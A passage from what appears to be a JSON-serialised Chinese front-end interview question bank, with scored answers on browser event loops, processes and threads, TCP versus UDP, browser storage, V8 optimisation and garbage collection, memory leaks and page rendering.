分）</h4>\\n<ul>\\n<li><p>浏览器的事件循环和Node.js的事件循环虽然都用于处理异步操作和事件驱动编程，但在实现方式和具体细节上存在一些区别。</p>\\n<p>首先，从执行环境来看，浏览器中的事件循环主要运行在Javascript引擎和渲染引擎之间，这可能会导致线程阻塞，尤其是在渲染进程和事件循环共享同一个线程时。而Node.js中的事件循环是运行在单独的线程中，基于事件驱动模型，通过事件循环来处理和派发事件，以及执行相应的回调函数。这种设计使得Node.js可以处理大量的并发请求。</p>\\n<p>其次，在宏任务和微任务的处理上，两者也有所不同。在浏览器中，宏任务和微任务是通过HTML5规范中定义的消息队列来实现的。所有的异步任务都被分为宏任务和微任务两种类型，并依次加入到对应的队列中。当当前的宏任务执行完毕后，会立即执行所有的微任务，然后再选择下一个宏任务执行。而Node.js使用libuv库提供的事件循环机制来管理宏任务，并使用process.nextTick()方法来实现微任务。在Node.js的事件循环中，所有的宏任务都被分为6个不同的阶段，每个阶段会执行一些同步和异步的操作。</p>\\n<p>另外，两者处理的事件类型也有所区别。浏览器中的事件循环主要用于处理用户交互事件（例如点击、滚动等）和网络请求等异步任务。而Node.js的事件循环则主要用于处理I/O操作（例如文件操作、网络请求等）和自定义的事件。</p>\\n</li>\\n</ul>\\n<h2>进程和线程的区别?</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（5 分）</h4>\\n<ul>\\n<li><p>. 进程是系统分配资源的基本单位，它包含独立的地址空间、资源表、堆栈、程序计数器等，每个进程都有独立的内存空间和系统资源。而线程是进程的一个实体，是CPU调度和分派的基本单位，线程只拥有一点在运行中必不可少的资源（如程序计数器，一组寄存器和栈），但它可与同属一个进程的其他的线程共享进程所拥有的全部资源。</p>\\n</li>\\n<li><p>. 由于线程共享进程的内存空间和资源，因此线程间的切换开销小，有利于并发执行。而进程间的切换需要涉及系统资源（如内存、打开的文件等）的分配与回收，开销较大。</p>\\n</li>\\n<li><p>进程是独立运行的，拥有独立的系统资源，包括内存、CPU时间、磁盘空间等。而线程只是进程的一个执行路径，共享进程的资源，因此线程之间没有独立的地址空间，一个线程死掉就等于整个进程死掉。</p>\\n</li>\\n<li><p>由于创建或撤销进程时，系统都要为之分配或回收资源，如内存空间、I/O设备等，所付出的开销远大于创建或撤销线程时的开销。同样，在进行进程切换时，涉及当前执行进程CPU环境的保存、新调度进程CPU环境的设置、各种进程资源状态的更改（如内存管理中的数据段、堆栈段和指针的更改）等，而线程切换只需保存和设置少量寄存器内容，不涉及存储管理等方面的操作。</p>\\n</li>\\n</ul>\\n<h2>什么是重绘和回流及怎么减少重绘和回流？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<ul>\\n<li><p>重绘（Repaint）：当页面中元素样式的改变不影响布局时，浏览器将只会重新绘制受影响的元素，这个过程称为重绘。例如，改变一个元素的背景色或文字颜色，但不影响其位置和大小，就会触发重绘。</p>\\n</li>\\n<li><p>回流（Reflow 或 Relayout）：也称为重排，当页面布局或几何属性发生变化时，浏览器需要重新计算元素的几何属性，并重新构建渲染树，这个过程称为回流。例如，改变元素的宽度、高度、位置等属性，或者添加、删除DOM节点，都会触发回流。</p>\\n</li>\\n</ul>\\n<h2>tcp和udp的区别？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（3 分）</h4>\\n<ul>\\n<li><p>TCP是面向连接的协议，它在数据发送之前需要首先建立连接，这通常通过三次握手来实现。连接建立后，数据可以在连接上进行可靠的传输。而UDP则是无连接的协议，它不需要建立连接，每个数据报都是独立的，因此它被称为“面向数据报”的协议。</p>\\n</li>\\n<li><p>CP提供了可靠的数据传输服务。它使用序列号、确认和重传机制来确保数据包的顺序和完整性。如果数据包在传输过程中丢失或损坏，TCP会负责重新发送这些数据包。相比之下，UDP不保证数据包的可靠传输。它不会检查数据包是否已经到达，也不会确认数据包是否按序到达。因此，UDP可能会出现丢包或乱序的情况。</p>\\n</li>\\n<li><p>由于UDP是无连接的，并且没有复杂的控制机制，因此它在处理数据时通常比TCP更高效。UDP的头部开销也较小，适用于对实时性要求较高的应用，如视频流、实时游戏等。而TCP由于需要建立连接并进行复杂的控制，所以在处理数据时可能会产生较大的延迟。</p>\\n</li>\\n<li><p>TCP具有流量控制功能，可以根据接收方的处理能力来发送数据，避免发送方发送速度过快导致接收方无法处理。而UDP没有流量控制功能，发送方可能会以超过接收方处理能力的速度发送数据，导致数据丢失。</p>\\n</li>\\n<li><p>TCP通常用于需要可靠传输的场景，如文件传输、电子邮件等。而UDP则适用于对实时性要求较高、对丢包容忍度较高的场景，如视频直播、在线游戏等。</p>\\n</li>\\n</ul>\\n<h2>浏览器 Eventloop</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（7 分）</h4>\\n<details>\\n\\n<ul>\\n<li><p><strong>1：</strong> 众所周知 JS 是⻔⾮阻塞单线程语⾔，因为在最初 JS 就是为了和浏览器交互⽽诞⽣的；如果 JS 是⻔多线程的语⾔话，我们在多个线程中处理 DOM 就可能会发⽣问题（⼀个线程中新加节点，另⼀个线程中删除节点），当然可以引⼊读写锁解决这个问题</p>\\n</li>\\n<li><p><strong>1：</strong> JS 在执⾏的过程中会产⽣执⾏环境，这些执⾏环境会被顺序的加⼊到执⾏栈中。如果遇到异步的代码，会被挂起并加⼊到 Task（有多种 task）队列中。⼀旦执⾏栈为空，Event Loop就会从 Task 队列中拿出需要执⾏的代码并放⼊执⾏栈中执⾏，所以本质上来说JS 中的异步还是同步⾏为</p>\\n</li>\\n<li><p><strong>1：</strong> 以下代码虽然 setTimeout 延时为 0，其实还是异步。这是因为 HTML5 标准规定这个函数第⼆个参数 <code>不得⼩于 4 毫秒</code>，不⾜会⾃动增加。所以 setTimeout 还是会在 script end\\n 之后打印</p>\\n</li>\\n</ul>\\n<pre><code class=\\"language-js\\">console.log(&#39;script start&#39;);\\n\\nsetTimeout(function(){\\n    console.log(&#39;setTimeout&#39;);\\n},0);\\n\\nconsole.log(&#39;script end&#39;);\\n</code></pre>\\n<ul>\\n<li><strong>1：</strong> 不同的任务源会被分配到不同的 Task 队列中，任务源可以分为微任务（microtask）和宏任务（macrotask）。在 ES6 规范中，microtask 称为 jobs，macrotask 称为 task</li>\\n</ul>\\n<pre><code class=\\"language-js\\">console.log(&#39;script start&#39;);\\n\\nsetTimeout(function () {\\n    console.log(&#39;setTimeout&#39;);\\n}, 0);\\n\\nnew Promise((resolve) =&gt; {\\n    console.log(&#39;Promise&#39;)\\n    resolve()\\n}).then(function () {\\n    console.log(&#39;promise1&#39;);\\n}).then(function () {\\n    console.log(&#39;promise2&#39;);\\n});\\n\\nconsole.log(&#39;script end&#39;);\\n\\n// 结果\\n// script start =&gt; Promise =&gt; script end =&gt; promise1 =&gt; promise2 =&gt; setTime\\n</code></pre>\\n<ul>\\n<li><p><strong>1：</strong> 微任务包括 process.nextTick、Promise、Object.observe、MutationObserver</p>\\n</li>\\n<li><p><strong>1：</strong> 宏任务包括 script、setTimeout、setInterval、setImmediate、I/O、UI renderin</p>\\n</li>\\n</ul>\\n<p>注：很多⼈有个误区，认为微任务快于宏任务，其实是错误的。因为宏任务中包括了 script，浏览器会先执⾏⼀个宏任务，接下来有异步代码的话就先执⾏微任务</p>\\n<ul>\\n<li><p><strong>1：</strong> 正确的⼀次 Event loop 顺序是这样的：</p>\\n<p>  执⾏同步代码，这属于宏任务</p>\\n<p>  执⾏栈为空，查询是否有微任务需要执⾏</p>\\n<p>  执⾏所有微任务</p>\\n<p>  必要的话渲染 UI</p>\\n<p>  然后开始下⼀轮 Event loop，执⾏宏任务中的异步代码</p>\\n</li>\\n</ul>\\n<p>注：如果宏任务中的异步代码有⼤量的计算并且需要操作 DOM 的话，为了更快的界⾯响应，我们可以把操作 DOM 放⼊微任务中</p>\\n</details>\\n\\n<h2>浏览器中常见的存储方式有哪些？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（4 分）</h4>\\n<ul>\\n<li><strong>1：</strong> Cookie，用于存储少量的用户信息，会随着每次 HTTP 请求发送到服务器。</li>\\n<li><strong>1：</strong> LocalStorage 用于持久化存储，大小一般在 5MB 左右，不会自动发送到服务器。</li>\\n<li><strong>1：</strong> SessionStorage 也是本地存储，但是数据在会话结束（浏览器关闭）后就会清除。</li>\\n<li><strong>1：</strong> IndexedDB 是一种更强大的非关系型数据库，用于存储大量的结构化数据。</li>\\n</ul>\\n<h2>常见的浏览器内核有哪些？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（4 分）</h4>\\n<ul>\\n<li><strong>1：</strong>  Trident内核：IE,MaxThon,TT,The World,360,搜狗浏览器等。[又称MSHTML]</li>\\n<li><strong>1：</strong>  Gecko内核：Netscape6及以上版本，FF,MozillaSuite/SeaMonkey等</li>\\n<li><strong>1：</strong>  Presto内核：Opera7及以上。      [Opera内核原为：Presto，现为：Blink;]</li>\\n<li><strong>1：</strong>  Webkit内核：Safari,Chrome等。   [ Chrome的：Blink（WebKit的分支）]</li>\\n</ul>\\n<h2>V8 引擎如何进行代码优化？</h2>\\n<h4>类型：<code>架构</code></h4>\\n<h4>级别：<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（12 分）</h4>\\n<ul>\\n<li>V8 引擎通过 即时编译（JIT） 和 优化编译 来提高 JavaScript 代码的执行效率。其主要流程包括：<ul>\\n<li>解释执行 ： V8 引擎首先将 JavaScript 代码解析成字节码，通过 Ignition 解释器 进行执行。当代码首次运行时，不会进行过多的优化</li>\\n<li>热点代码识别 ： V8 会通过 热点代码识别 来跟踪哪些代码在运行过程中被频繁调用，通常这些代码就是性能瓶颈所在。V8 通过 优化编译器（Turbofan）对这些热点代码进行进一步优化。</li>\\n<li>优化编译 ： 对于频繁执行的代码，V8 会将它们提升为 优化过的机器码，并进行一些优化策略，如内联缓存、死代码消除、循环展开等，进一步提高执行效率</li>\\n<li>逃逸分析 ： V8 会对代码进行逃逸分析 escape analysis ，以确定变量是否会被外部访问。如果一个变量只在函数内部使用，V8 会将其优化为栈上分配，从而减少堆内存的分配</li>\\n<li>内联缓存 ： V8 在对对象属性的访问进行优化时，会使用内联缓存来减少属性查找的开销。当某个属性频繁被访问时，V8 会将查找结果缓存起来，从而加速后续的访问</li>\\n<li>代码优化和弃用 ：当 V8 发现代码的执行模式发生变化时，它会动态调整优化策略。如果某些优化的代码变得低效或不再热，V8 会丢弃之前的优化，回退到解释执行模式</li>\\n</ul>\\n</li>\\n</ul>\\n","ast":[{"type":"heading","raw":"# 浏览器原理篇\\n\\n","depth":1,"text":"浏览器原理篇","tokens":[{"type":"text","raw":"浏览器原理篇","text":"浏览器原理篇","escaped":false}]},{"type":"heading","raw":"## 浏览器垃圾回收机制 - V8的垃圾回收机制是怎样的\\n\\n","depth":2,"text":"浏览器垃圾回收机制 - V8的垃圾回收机制是怎样的","tokens":[{"type":"text","raw":"浏览器垃圾回收机制 - V8的垃圾回收机制是怎样的","text":"浏览器垃圾回收机制 - V8的垃圾回收机制是怎样的","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（3 分）\\n\\n","depth":4,"text":"解答（3 分）","tokens":[{"type":"text","raw":"解答（3 分）","text":"解答（3 分）","escaped":false}]},{"type":"list","raw":"- **1：** V8 实现了准确式 GC，GC 算法采用了分代式垃圾回收机制。因此，V8 将内存（堆）分为新生代和老生代两部分。\\n- **1：**（1）新生代算法 新生代中的对象一般存活时间较短，使用 Scavenge GC 算法。\\n- **1：**（2）老生代算法 老生代中的对象一般存活时间较长且数量也多，使用了两个算法，分别是标记清除算法和标记压缩算法。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** V8 实现了准确式 GC，GC 算法采用了分代式垃圾回收机制。因此，V8 将内存（堆）分为新生代和老生代两部分。\\n","task":false,"loose":false,"text":"**1：** V8 实现了准确式 GC，GC 算法采用了分代式垃圾回收机制。因此，V8 将内存（堆）分为新生代和老生代两部分。","tokens":[{"type":"text","raw":"**1：** V8 实现了准确式 GC，GC 算法采用了分代式垃圾回收机制。因此，V8 将内存（堆）分为新生代和老生代两部分。","text":"**1：** V8 实现了准确式 GC，GC 算法采用了分代式垃圾回收机制。因此，V8 将内存（堆）分为新生代和老生代两部分。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" V8 实现了准确式 GC，GC 算法采用了分代式垃圾回收机制。因此，V8 将内存（堆）分为新生代和老生代两部分。","text":" V8 实现了准确式 GC，GC 算法采用了分代式垃圾回收机制。因此，V8 将内存（堆）分为新生代和老生代两部分。","escaped":false}]}]},{"type":"list_item","raw":"- **1：**（1）新生代算法 新生代中的对象一般存活时间较短，使用 Scavenge GC 算法。\\n","task":false,"loose":false,"text":"**1：**（1）新生代算法 新生代中的对象一般存活时间较短，使用 Scavenge GC 算法。","tokens":[{"type":"text","raw":"**1：**（1）新生代算法 新生代中的对象一般存活时间较短，使用 Scavenge GC 算法。","text":"**1：**（1）新生代算法 新生代中的对象一般存活时间较短，使用 Scavenge GC 算法。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":"（1）新生代算法 新生代中的对象一般存活时间较短，使用 Scavenge GC 算法。","text":"（1）新生代算法 新生代中的对象一般存活时间较短，使用 Scavenge GC 算法。","escaped":false}]}]},{"type":"list_item","raw":"- **1：**（2）老生代算法 老生代中的对象一般存活时间较长且数量也多，使用了两个算法，分别是标记清除算法和标记压缩算法。","task":false,"loose":false,"text":"**1：**（2）老生代算法 老生代中的对象一般存活时间较长且数量也多，使用了两个算法，分别是标记清除算法和标记压缩算法。","tokens":[{"type":"text","raw":"**1：**（2）老生代算法 老生代中的对象一般存活时间较长且数量也多，使用了两个算法，分别是标记清除算法和标记压缩算法。","text":"**1：**（2）老生代算法 老生代中的对象一般存活时间较长且数量也多，使用了两个算法，分别是标记清除算法和标记压缩算法。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":"（2）老生代算法 老生代中的对象一般存活时间较长且数量也多，使用了两个算法，分别是标记清除算法和标记压缩算法。","text":"（2）老生代算法 老生代中的对象一般存活时间较长且数量也多，使用了两个算法，分别是标记清除算法和标记压缩算法。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 哪些操作会造成内存泄漏？\\n\\n","depth":2,"text":"哪些操作会造成内存泄漏？","tokens":[{"type":"text","raw":"哪些操作会造成内存泄漏？","text":"哪些操作会造成内存泄漏？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（4 分）\\n\\n","depth":4,"text":"解答（4 分）","tokens":[{"type":"text","raw":"解答（4 分）","text":"解答（4 分）","escaped":false}]},{"type":"list","raw":"- **1：** 第一种情况是由于使用未声明的变量，而意外的创建了一个全局变量，而使这个变量一直留在内存中无法被回收。\\n- **1：** 第二种情况是设置了 setInterval 定时器，而忘记取消它，如果循环函数有对外部变量的引用的话，那么这个变量会被一直留在内存中，而无法被回收。\\n- **1：** 第三种情况是获取一个 DOM 元素的引用，而后面这个元素被删除，由于我们一直保留了对这个元素的引用，所以它也无法被回收。\\n- **1：** 第四种情况是不合理的使用闭包，从而导致某些变量一直被留在内存当中。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** 第一种情况是由于使用未声明的变量，而意外的创建了一个全局变量，而使这个变量一直留在内存中无法被回收。\\n","task":false,"loose":false,"text":"**1：** 第一种情况是由于使用未声明的变量，而意外的创建了一个全局变量，而使这个变量一直留在内存中无法被回收。","tokens":[{"type":"text","raw":"**1：** 第一种情况是由于使用未声明的变量，而意外的创建了一个全局变量，而使这个变量一直留在内存中无法被回收。","text":"**1：** 第一种情况是由于使用未声明的变量，而意外的创建了一个全局变量，而使这个变量一直留在内存中无法被回收。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 第一种情况是由于使用未声明的变量，而意外的创建了一个全局变量，而使这个变量一直留在内存中无法被回收。","text":" 第一种情况是由于使用未声明的变量，而意外的创建了一个全局变量，而使这个变量一直留在内存中无法被回收。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 第二种情况是设置了 setInterval 定时器，而忘记取消它，如果循环函数有对外部变量的引用的话，那么这个变量会被一直留在内存中，而无法被回收。\\n","task":false,"loose":false,"text":"**1：** 第二种情况是设置了 setInterval 定时器，而忘记取消它，如果循环函数有对外部变量的引用的话，那么这个变量会被一直留在内存中，而无法被回收。","tokens":[{"type":"text","raw":"**1：** 第二种情况是设置了 setInterval 定时器，而忘记取消它，如果循环函数有对外部变量的引用的话，那么这个变量会被一直留在内存中，而无法被回收。","text":"**1：** 第二种情况是设置了 setInterval 定时器，而忘记取消它，如果循环函数有对外部变量的引用的话，那么这个变量会被一直留在内存中，而无法被回收。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 第二种情况是设置了 setInterval 定时器，而忘记取消它，如果循环函数有对外部变量的引用的话，那么这个变量会被一直留在内存中，而无法被回收。","text":" 第二种情况是设置了 setInterval 定时器，而忘记取消它，如果循环函数有对外部变量的引用的话，那么这个变量会被一直留在内存中，而无法被回收。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 第三种情况是获取一个 DOM 元素的引用，而后面这个元素被删除，由于我们一直保留了对这个元素的引用，所以它也无法被回收。\\n","task":false,"loose":false,"text":"**1：** 第三种情况是获取一个 DOM 元素的引用，而后面这个元素被删除，由于我们一直保留了对这个元素的引用，所以它也无法被回收。","tokens":[{"type":"text","raw":"**1：** 第三种情况是获取一个 DOM 元素的引用，而后面这个元素被删除，由于我们一直保留了对这个元素的引用，所以它也无法被回收。","text":"**1：** 第三种情况是获取一个 DOM 元素的引用，而后面这个元素被删除，由于我们一直保留了对这个元素的引用，所以它也无法被回收。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 第三种情况是获取一个 DOM 元素的引用，而后面这个元素被删除，由于我们一直保留了对这个元素的引用，所以它也无法被回收。","text":" 第三种情况是获取一个 DOM 元素的引用，而后面这个元素被删除，由于我们一直保留了对这个元素的引用，所以它也无法被回收。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 第四种情况是不合理的使用闭包，从而导致某些变量一直被留在内存当中。","task":false,"loose":false,"text":"**1：** 第四种情况是不合理的使用闭包，从而导致某些变量一直被留在内存当中。","tokens":[{"type":"text","raw":"**1：** 第四种情况是不合理的使用闭包，从而导致某些变量一直被留在内存当中。","text":"**1：** 第四种情况是不合理的使用闭包，从而导致某些变量一直被留在内存当中。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 第四种情况是不合理的使用闭包，从而导致某些变量一直被留在内存当中。","text":" 第四种情况是不合理的使用闭包，从而导致某些变量一直被留在内存当中。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 浏览器的渲染过程\\n\\n","depth":2,"text":"浏览器的渲染过程","tokens":[{"type":"text","raw":"浏览器的渲染过程","text":"浏览器的渲染过程","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（5 分）\\n\\n","depth":4,"text":"解答（5 分）","tokens":[{"type":"text","raw":"解答（5 分）","text":"解答（5 分）","escaped":false}]},{"type":"list","raw":"- **1：** 首先解析收到的文档，根据文档定义构建一棵 DOM 树，DOM 树是由 DOM 元素及属性节点组成的。\\n- **1：** 然后对 CSS 进行解析，生成 CSSOM 规则树。\\n- **1：** 根据 DOM 树和 CSSOM 规则树构建渲染树。渲染树的节点被称为渲染对象，渲染对象是一个包含有颜色和大小等属性的矩形，渲染对象和 DOM 元素相对应，但这种对应关系不是一对一的，不可见的 DOM 元素不会被插入渲染树。还有一些 DOM元素对应几个可见对象，它们一般是一些具有复杂结构的元素，无法用一个矩形来描述。\\n- **1：** 当渲染对象被创建并添加到树中，它们并没有位置和大小，所以当浏览器生成渲染树以后，就会根据渲染树来进行布局（也可以叫做回流）。这一阶段浏览器要做的事情是要弄清楚各个节点在页面中的确切位置和大小。通常这一行为也被称为“自动重排”。\\n- **1：** 布局阶段结束后是绘制阶段，遍历渲染树并调用渲染对象的 paint 方法将它们的内容显示在屏幕上，绘制使用 UI 基础组件。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** 首先解析收到的文档，根据文档定义构建一棵 DOM 树，DOM 树是由 DOM 元素及属性节点组成的。\\n","task":false,"loose":false,"text":"**1：** 首先解析收到的文档，根据文档定义构建一棵 DOM 树，DOM 树是由 DOM 元素及属性节点组成的。","tokens":[{"type":"text","raw":"**1：** 首先解析收到的文档，根据文档定义构建一棵 DOM 树，DOM 树是由 DOM 元素及属性节点组成的。","text":"**1：** 首先解析收到的文档，根据文档定义构建一棵 DOM 树，DOM 树是由 DOM 元素及属性节点组成的。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 首先解析收到的文档，根据文档定义构建一棵 DOM 树，DOM 树是由 DOM 元素及属性节点组成的。","text":" 首先解析收到的文档，根据文档定义构建一棵 DOM 树，DOM 树是由 DOM 元素及属性节点组成的。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 然后对 CSS 进行解析，生成 CSSOM 规则树。\\n","task":false,"loose":false,"text":"**1：** 然后对 CSS 进行解析，生成 CSSOM 规则树。","tokens":[{"type":"text","raw":"**1：** 然后对 CSS 进行解析，生成 CSSOM 规则树。","text":"**1：** 然后对 CSS 进行解析，生成 CSSOM 规则树。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 然后对 CSS 进行解析，生成 CSSOM 规则树。","text":" 然后对 CSS 进行解析，生成 CSSOM 规则树。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 根据 DOM 树和 CSSOM 规则树构建渲染树。渲染树的节点被称为渲染对象，渲染对象是一个包含有颜色和大小等属性的矩形，渲染对象和 DOM 元素相对应，但这种对应关系不是一对一的，不可见的 DOM 元素不会被插入渲染树。还有一些 DOM元素对应几个可见对象，它们一般是一些具有复杂结构的元素，无法用一个矩形来描述。\\n","task":false,"loose":false,"text":"**1：** 根据 DOM 树和 CSSOM 规则树构建渲染树。渲染树的节点被称为渲染对象，渲染对象是一个包含有颜色和大小等属性的矩形，渲染对象和 DOM 元素相对应，但这种对应关系不是一对一的，不可见的 DOM 元素不会被插入渲染树。还有一些 DOM元素对应几个可见对象，它们一般是一些具有复杂结构的元素，无法用一个矩形来描述。","tokens":[{"type":"text","raw":"**1：** 根据 DOM 树和 CSSOM 规则树构建渲染树。渲染树的节点被称为渲染对象，渲染对象是一个包含有颜色和大小等属性的矩形，渲染对象和 DOM 元素相对应，但这种对应关系不是一对一的，不可见的 DOM 元素不会被插入渲染树。还有一些 DOM元素对应几个可见对象，它们一般是一些具有复杂结构的元素，无法用一个矩形来描述。","text":"**1：** 根据 DOM 树和 CSSOM 规则树构建渲染树。渲染树的节点被称为渲染对象，渲染对象是一个包含有颜色和大小等属性的矩形，渲染对象和 DOM 元素相对应，但这种对应关系不是一对一的，不可见的 DOM 元素不会被插入渲染树。还有一些 DOM元素对应几个可见对象，它们一般是一些具有复杂结构的元素，无法用一个矩形来描述。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 根据 DOM 树和 CSSOM 规则树构建渲染树。渲染树的节点被称为渲染对象，渲染对象是一个包含有颜色和大小等属性的矩形，渲染对象和 DOM 元素相对应，但这种对应关系不是一对一的，不可见的 DOM 元素不会被插入渲染树。还有一些 DOM元素对应几个可见对象，它们一般是一些具有复杂结构的元素，无法用一个矩形来描述。","text":" 根据 DOM 树和 CSSOM 规则树构建渲染树。渲染树的节点被称为渲染对象，渲染对象是一个包含有颜色和大小等属性的矩形，渲染对象和 DOM 元素相对应，但这种对应关系不是一对一的，不可见的 DOM 元素不会被插入渲染树。还有一些 DOM元素对应几个可见对象，它们一般是一些具有复杂结构的元素，无法用一个矩形来描述。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 当渲染对象被创建并添加到树中，它们并没有位置和大小，所以当浏览器生成渲染树以后，就会根据渲染树来进行布局（也可以叫做回流）。这一阶段浏览器要做的事情是要弄清楚各个节点在页面中的确切位置和大小。通常这一行为也被称为“自动重排”。\\n","task":false,"loose":false,"text":"**1：** 当渲染对象被创建并添加到树中，它们并没有位置和大小，所以当浏览器生成渲染树以后，就会根据渲染树来进行布局（也可以叫做回流）。这一阶段浏览器要做的事情是要弄清楚各个节点在页面中的确切位置和大小。通常这一行为也被称为“自动重排”。","tokens":[{"type":"text","raw":"**1：** 当渲染对象被创建并添加到树中，它们并没有位置和大小，所以当浏览器生成渲染树以后，就会根据渲染树来进行布局（也可以叫做回流）。这一阶段浏览器要做的事情是要弄清楚各个节点在页面中的确切位置和大小。通常这一行为也被称为“自动重排”。","text":"**1：** 当渲染对象被创建并添加到树中，它们并没有位置和大小，所以当浏览器生成渲染树以后，就会根据渲染树来进行布局（也可以叫做回流）。这一阶段浏览器要做的事情是要弄清楚各个节点在页面中的确切位置和大小。通常这一行为也被称为“自动重排”。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 